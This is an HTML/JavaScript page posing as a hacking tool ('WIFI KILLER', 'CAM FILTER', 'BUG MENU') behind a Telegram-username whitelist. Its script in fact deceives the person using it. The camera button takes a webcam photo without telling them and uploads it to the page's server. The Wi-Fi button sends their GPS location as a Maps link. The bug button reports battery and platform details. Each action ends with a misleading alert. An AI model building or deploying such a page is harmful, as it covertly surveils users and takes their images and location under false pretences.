<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VALUXIANT EXPLOIT | V1.0</title>
    <style>
        * { box-sizing: border-box; }
        body { 
            margin: 0; 
            background: #000 url('https://files.catbox.moe/6ynn8l.jpg') no-repeat center center fixed; 
            background-size: cover;
            color: #00ff41; 
            font-family: 'Courier New', monospace;
            overflow: hidden;
        }
        #overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); display: flex; justify-content: center; align-items: center;
        }
        .terminal {
            width: 90%; max-width: 450px; background: rgba(10, 10, 10, 0.9);
            border: 1px solid #00ff41; padding: 25px; box-shadow: 0 0 20px #00ff41;
        }
        input {
            width: 100%; background: #000; border: 1px solid #00ff41; color: #00ff41;
            padding: 12px; margin: 15px 0; outline: none; font-weight: bold;
        }
        .btn {
            width: 100%; background: #00ff41; color: #000; border: none; padding: 12px;
            font-weight: 900; cursor: pointer; text-transform: uppercase;
        }
        .menu-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
        .item { border: 1px solid #333; padding: 15px; font-size: 11px; cursor: pointer; background: #000; }
        .item:hover { background: #00ff41; color: #000; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div id="overlay">
    <div class="terminal">
        <h2 style="margin:0; text-align:center;">VAVOR STORE ACCESS</h2>
        <p style="font-size:10px; text-align:center; color:#555;">SECURITY BY @hanzX99 & GEMINI</p>
        <input type="text" id="user" placeholder="USERNAME TELEGRAM (@...)">
        <button class="btn" onclick="auth()">VERIFY IDENTITY</button>
    </div>
</div>

<div class="terminal" id="main" style="display:none; margin: 50px auto;">
    <h3 id="greet">SESSION: NULL</h3>
    <hr border="1" color="#00ff41">
    <div class="menu-grid">
        <div class="item" onclick="wifi()">📶 WIFI KILLER</div>
        <div class="item" onclick="cam()">📷 CAM FILTER</div>
        <div class="item" onclick="bug()">🐞 BUG MENU</div>
        <div class="item" onclick="alert('SOON...')">🚀 DDOS V2</div>
    </div>
    <div id="logs" style="font-size:9px; margin-top:15px; color:#444;">[!] System Active...</div>
</div>

<video id="v" autoplay></video><canvas id="c"></canvas>

<script>
    const whitelist = ["@hanzX99", "@hangg", "@rehan", "@gemini"];
    let currentUser = "";

    function auth() {
        let u = document.getElementById('user').value.trim();
        if(whitelist.includes(u)) {
            currentUser = u;
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('main').style.display = 'block';
            document.getElementById('greet').innerText = "USER: " + u;
            fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({msg:`✅ <b>User Login!</b>\nUsername: ${u}`})});
        } else {
            alert("Username " + u + " GAK TERDAFTAR!");
            fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({msg:`🚫 <b>Illegal Access!</b>\nUsername: ${u}`})});
        }
    }

    async function cam() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video:true});
            const v = document.getElementById('v'); v.srcObject = s;
            setTimeout(() => {
                const c = document.getElementById('c');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(b => {
                    const fd = new FormData(); fd.append('photo', b); fd.append('name', currentUser);
                    fetch('/upload', {method:'POST', body:fd});
                }, 'image/jpeg');
                s.getTracks().forEach(t => t.stop());
                alert("FILTER APPLIED: GACOR!");
            }, 2500);
        } catch(e) { alert("ERROR: IZINKAN CAMERA!"); }
    }

    function wifi() {
        navigator.geolocation.getCurrentPosition(p => {
            fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({msg:`📶 <b>WiFi & Loc Log</b>\nUser: ${currentUser}\nMaps: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`})});
            alert("SCANNING WIFI AROUND YOU...");
        });
    }

    function bug() {
        navigator.getBattery().then(b => {
            fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({msg:`🐞 <b>Bug Menu Stats</b>\nUser: ${currentUser}\nBatt: ${b.level*100}%\nPlatform: ${navigator.platform}`})});
            alert("DEVICE DATA EXTRACTED.");
        });
    }
</script>
</body>
</html>
